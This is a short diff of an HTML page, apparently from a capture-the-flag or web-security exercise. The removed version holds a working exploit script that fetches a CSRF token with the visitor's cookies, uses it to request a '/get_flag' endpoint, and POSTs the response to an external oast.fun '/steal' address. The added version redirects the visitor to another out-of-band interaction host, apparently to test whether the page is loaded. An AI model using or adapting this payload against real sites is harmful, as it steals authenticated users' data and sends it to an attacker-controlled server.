@@ -1,29 +1,13 @@
 <!DOCTYPE html>
 <html>
-<body>
-<script>
-(async () => {
-  const csrf = await fetch('/csrf-token', { credentials: 'include' });
-  const data = await csrf.json();
-
-  const res = await fetch('/get_flag?csrf_token=' + data.csrf_token, {
-    method: 'GET',
-    credentials: 'include',
-    headers: {
-      'X-CSRF-Token': data.csrf_token,
-      'Authorization': 'Bearer ' + data.csrf_token
-    }
-  });
-
-  const flag = await res.text();
-
-  // Send to your server
-  await fetch('https://khlwyksbwtzhtdblrcgw7syuuip31zuim.oast.fun/steal', {
-    method: 'POST',
-    mode: 'no-cors',
-    body: flag
-  });
-})();
-</script>
-</body>
+  <head>
+    <title>Redirect Test</title>
+  </head>
+  <body>
+    <h1>Testing JS Redirect...</h1>
+    <script>
+      // Redirect to Burp Collaborator / OAST server
+      location.href = "https://umfjohvrfoafimtlboxlj4d7o9z29szmf.oast.fun";
+    </script>
+  </body>
 </html>
